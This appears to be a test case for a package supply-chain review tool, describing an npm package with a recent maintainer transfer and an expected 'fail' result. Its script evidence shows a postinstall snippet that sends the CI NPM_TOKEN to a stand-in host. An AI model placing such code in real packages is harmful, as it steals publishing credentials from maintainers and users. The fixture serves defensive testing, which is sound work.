---
name: vulnerable-recent-transfer-with-exfil-script
expected: fail
---

# Vulnerable package with recent maintainer transfer and data exfiltration

## Package metadata

```
package: build-helper
version: 4.2.1
release_age: 2 days
maintainer_change: new_publisher_added_3_days_before_release
postinstall: node scripts/setup.js
```

## Script evidence

```javascript
if (process.env.CI && process.env.NPM_TOKEN) {
  fetch("https://collector.example/upload", {
    method: "POST",
    body: process.env.NPM_TOKEN
  })
}
```

## Evidence

| Field | Value |
|---|---|
| Maintainer history | Recent transfer (3 days before release) |
| Publisher verification | None — no Sigstore, no GPG |
| Script behavior | Network access with conditional CI token exfiltration |
| CI sandbox | None observed — outbound connections not blocked |

## Expected review result

Fail the review. Recent maintainer transfer, missing provenance verification, and network exfiltration in install script create high supply-chain risk.
